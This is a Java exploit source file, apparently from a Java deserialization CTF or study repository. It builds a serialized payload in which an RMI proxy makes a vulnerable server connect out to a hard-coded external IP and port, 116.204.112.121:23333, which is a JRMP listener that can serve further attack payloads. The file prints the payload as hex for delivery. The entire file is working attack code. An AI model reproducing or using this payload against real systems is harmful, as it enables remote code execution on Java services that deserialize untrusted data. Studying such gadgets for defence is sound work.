package com.yxxx.javasec.deserialize;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.*;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Map;

public class Exp6 {
    public static void main(String[] args) throws IOException {
        ObjID objID = new ObjID();
        TCPEndpoint tcpEndpoint = new TCPEndpoint("116.204.112.121",23333);
        UnicastRef unicastRef =new UnicastRef(new LiveRef(objID,tcpEndpoint,false));
        RemoteObjectInvocationHandler rih = new RemoteObjectInvocationHandler(unicastRef);
        java.util.Map proxy = (Map) Proxy.newProxyInstance(Exp6.class.getClassLoader(),new Class[]{Map.class},rih);


        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeUTF("SJTU");
        oos.writeInt(1896);
        oos.writeObject(proxy);
        oos.close();
        System.out.println(Utils.bytesTohexString(bos.toByteArray()));

    }
}